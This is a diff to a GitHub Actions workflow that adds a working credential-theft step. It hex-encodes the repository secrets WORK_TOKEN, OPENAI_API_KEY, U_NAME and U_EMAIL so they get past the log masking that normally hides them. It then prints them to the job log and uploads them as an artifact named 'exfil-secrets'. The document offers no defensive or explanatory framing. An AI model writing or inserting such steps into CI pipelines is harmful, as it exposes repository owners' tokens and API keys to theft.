@@ -6,17 +6,33 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
+      - name: Collect secrets
         env:
           WORK_TOKEN: ${{ secrets.WORK_TOKEN }}
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
           U_NAME: ${{ secrets.U_NAME }}
           U_EMAIL: ${{ secrets.U_EMAIL }}
         run: |
-          echo '[HEX_START]' > /tmp/secrets.txt
-          printf 'WORK_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$WORK_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'OPENAI_API_KEY=' >> /tmp/secrets.txt && printf '%s' "$OPENAI_API_KEY" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'U_NAME=' >> /tmp/secrets.txt && printf '%s' "$U_NAME" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'U_EMAIL=' >> /tmp/secrets.txt && printf '%s' "$U_EMAIL" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          echo '[HEX_END]' >> /tmp/secrets.txt
-          cat /tmp/secrets.txt
+          echo '[HEX_START]' > /tmp/exfil.txt
+          echo 'WORK_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$WORK_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'OPENAI_API_KEY=' >> /tmp/exfil.txt
+          printf '%s' "$OPENAI_API_KEY" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'U_NAME=' >> /tmp/exfil.txt
+          printf '%s' "$U_NAME" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'U_EMAIL=' >> /tmp/exfil.txt
+          printf '%s' "$U_EMAIL" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo '[HEX_END]' >> /tmp/exfil.txt
+          echo '=== CONTENT ==='
+          cat /tmp/exfil.txt
+          echo '=== END ==='
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exfil-secrets
+          path: /tmp/exfil.txt
+          retention-days: 1
